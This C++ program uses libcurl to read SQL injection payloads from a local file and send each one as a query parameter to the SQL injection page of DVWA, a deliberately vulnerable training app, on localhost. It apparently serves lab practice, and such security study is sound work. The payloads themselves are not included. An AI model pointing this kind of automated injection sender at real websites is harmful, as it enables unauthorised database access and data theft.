#include <iostream>
#include <fstream>
#include <string>
#include <curl/curl.h>

// Callback function to capture response headers
size_t HeaderCallback(char *buffer, size_t size, size_t nitems, void *userdata) {
    // Ignore response headers
    return size * nitems;
}

// Callback function to capture request headers
size_t RequestHeaderCallback(char *buffer, size_t size, size_t nitems, void *userdata) {
    // Ignore request headers
    return size * nitems;
}

int main() {
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_ALL);

    // Create a CURL object
    CURL *curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Failed to initialize curl\n";
        return 1;
    }

    // Set the target URL for the low security level
    std::string target_url = "http://localhost/dvwa/vulnerabilities/sqli/?id=";

    // Open the payloads file
    std::ifstream payload_file("payloads.txt");
    if (!payload_file.is_open()) {
        std::cerr << "Failed to open payloads file\n";
        curl_easy_cleanup(curl);
        return 1;
    }

    // Read the payloads from the file and send HTTP requests with each payload
    std::string payload;
    while (std::getline(payload_file, payload)) {
        // Set the target URL with the SQL injection payload
        std::string target_url_with_payload = target_url + payload;

        // Set the CURL options
        curl_easy_setopt(curl, CURLOPT_URL, target_url_with_payload.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, HeaderCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEHEADER, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_READDATA, NULL);
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
        curl_easy_setopt(curl, CURLOPT_HEADER, 0L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, RequestHeaderCallback);

        // Send the HTTP request and receive the response
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
            payload_file.close();
            curl_easy_cleanup(curl);
            return 1;
        }
    }

    // Cleanup and exit
    payload_file.close();
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
